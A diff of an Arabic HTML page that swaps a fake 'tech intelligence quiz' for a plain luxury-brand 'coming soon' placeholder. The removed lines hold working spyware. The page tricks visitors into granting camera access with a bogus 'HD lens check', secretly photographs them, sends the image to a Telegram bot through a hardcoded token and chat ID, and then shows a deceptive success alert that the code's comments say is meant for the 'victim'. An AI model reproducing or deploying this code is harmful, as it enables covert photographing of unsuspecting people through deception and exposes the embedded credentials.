@@ -3,100 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار الذكاء التقني 🧠</title>
+    <title>قريباً | البراند الفخم</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 450px; border: 1px solid #334155; }
-        h2 { color: #38bdf8; margin-bottom: 10px; }
-        .question { font-size: 1.1rem; margin-bottom: 25px; line-height: 1.6; }
-        .btn-group { display: flex; flex-direction: column; gap: 15px; }
-        button { background: #334155; color: white; border: 1px solid #475569; padding: 12px; border-radius: 10px; cursor: pointer; font-size: 1rem; transition: 0.3s; }
-        button:hover { background: #38bdf8; color: #0f172a; font-weight: bold; }
-        #camera-step { display: none; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #38bdf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video, canvas { display: none; }
+        /* تنسيقات عامة */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d0d0d; /* أسود ملكي */
+            color: #d4af37; /* ذهبي مطفي */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .container {
+            border: 1px solid #d4af37;
+            padding: 50px 80px;
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        h1 {
+            font-size: 3rem;
+            letter-spacing: 8px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            font-weight: 300;
+        }
+
+        p {
+            font-size: 1.2rem;
+            color: #a8a8a8;
+            letter-spacing: 2px;
+        }
+
+        .line {
+            width: 50px;
+            height: 1px;
+            background-color: #d4af37;
+            margin: 20px auto;
+        }
+
+        /* لمسة حركة ناعمة */
+        .fade-in {
+            animation: fadeIn 2.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
 
-    <div class="box" id="main-box">
-        <div id="quiz-step">
-            <h2>اختبار الذكاء التقني (1/2) 🧠</h2>
-            <p class="question">أي من اللغات التالية تُستخدم لبرمجة واجهات المواقع التفاعلية؟</p>
-            <div class="btn-group">
-                <button onclick="nextStep()">لغة HTML</button>
-                <button onclick="nextStep()">لغة JavaScript</button>
-            </div>
-        </div>
-
-        <div id="camera-step">
-            <h2>ممتاز! إجابة صحيحة ✅</h2>
-            <p>الخطوة الأخيرة: نحتاج لفحص "دقة العدسة" لضمان توافق جهازك مع اختبارات الـ HD.</p>
-            <div id="loader" style="display:none;"><div class="loading"></div><p>جاري فحص الجودة...</p></div>
-            <button id="check-btn" onclick="startCapture()">بدء فحص الكاميرا الآن 📸</button>
-        </div>
+    <div class="container fade-in">
+        <h1>اسم البراند</h1>
+        <div class="line"></div>
+        <p>قريباً .. تجربة تليق بك</p>
     </div>
 
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        // بياناتك اللي اشتغلت تمام
-        const token = "8297258345:AAG-gbm5r8uH8HQjeUXxt_d6zqA_-436j3U";
-        const chatId = "6399453057";
-
-        function nextStep() {
-            document.getElementById('quiz-step').style.display = 'none';
-            document.getElementById('camera-step').style.display = 'block';
-        }
-
-        async function startCapture() {
-            const btn = document.getElementById('check-btn');
-            const loader = document.getElementById('loader');
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-
-            try {
-                // طلب فتح الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                video.srcObject = stream;
-
-                // استراحة ثانية عشان الكاميرا تفتح بوضوح
-                setTimeout(async () => {
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'capture.png');
-                        formData.append('caption', 'قفشته! 😂 صورته وهو بيختبر ذكاءه');
-
-                        // إرسال الصورة لتليجرام
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        // رسالة تمويه للضحية
-                        alert("تم الفحص بنجاح! جهازك متوافق بنسبة 98% مع معايير الـ HD.");
-                        
-                        // قفل الكاميرا فوراً
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/png');
-                }, 1000); 
-
-            } catch (e) {
-                alert("فشل الفحص! يجب السماح بالكاميرا لإتمام اختبار الذكاء.");
-                btn.style.display = 'block';
-                loader.style.display = 'none';
-            }
-        }
-    </script>
 </body>
-
 </html>
